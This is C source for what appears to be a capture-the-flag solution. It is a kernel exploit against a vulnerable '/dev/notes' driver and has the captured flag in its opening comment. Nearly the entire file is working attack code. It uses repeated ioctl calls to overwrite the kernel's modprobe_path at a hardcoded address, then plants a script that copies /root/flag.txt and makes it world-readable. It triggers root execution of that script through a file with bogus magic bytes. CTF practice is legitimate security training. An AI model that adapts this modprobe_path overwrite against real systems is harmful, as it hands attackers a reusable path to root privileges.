// flag{41n7_N0_K3Rn3L_57R0nG_3n0ugH_F0R_m3}
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>

char buf[0x200];
long *num = buf;

int main()
{
	int fd = open("/dev/notes", O_RDWR);

	memset(buf, 0x41, 0x30);
	write(fd, buf, 0x30);

	long modprobe_path = 0xffffffff81a3f9c0;
	num[0] = buf + 0x20;
	num[1] = 0x40;
	num[2] = 0;
	memset(buf + 0x20, 0x71, 0x40);
	num[10] = modprobe_path;
	ioctl(fd, 0xffffffffc009e900, num);
	ioctl(fd, 0xffffffffc009e900, num);
	ioctl(fd, 0xffffffffc009e900, num);
	ioctl(fd, 0xffffffffc009e900, num);
	ioctl(fd, 0xffffffffc009e900, num);

	num[0] = "/home/n00b/copy";
	num[1] = 0x40;
	num[2] = 1;
	ioctl(fd, 0xffffffffc009e900, num);

	puts("[+] Setup for modprobe_path exploit");
    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/n00b/flag\n/bin/chmod 777 /home/n00b/flag' > /home/n00b/copy");
    system("chmod +x /home/n00b/copy");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/n00b/dummy");
    system("chmod +x /home/n00b/dummy");
	system("/home/n00b/dummy");
	
	system("cat /home/n00b/flag");

	return 0;
}
